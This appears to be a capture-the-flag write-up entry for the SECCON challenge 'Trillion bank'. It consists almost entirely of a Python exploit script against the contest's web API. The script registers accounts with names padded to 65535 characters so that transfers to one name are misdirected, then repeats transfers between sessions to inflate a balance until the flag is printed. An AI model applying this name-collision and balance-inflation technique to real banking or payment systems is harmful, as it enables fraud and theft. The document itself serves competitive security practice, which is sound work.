### Trillion bank

Our exploit:

```py
import requests


url = 'http://trillion.seccon.games:3000'
# url = 'http://127.0.0.1:3000'

PAYLOAD = 'justcatthefish007'
PAYLOAD += (0xFFFF - len(PAYLOAD)) * 'q'

sessions = []
for x in range(3):
    s = requests.session()
    if x == 0: x = ''
    s.post(url + '/api/register', json={'name': PAYLOAD + str(x)})
    sessions.append(s)


balance = [10, 10]
while True:
    for x in range(2):
        sessions[x+1].post(url + '/api/transfer', json={'recipientName': PAYLOAD, 'amount': balance[x]})
        balance[(x+1)%2] += balance[x]

    try:
        print(sessions[0].get(url + '/api/me').json()['flag'])
        break
    except:
        pass
```
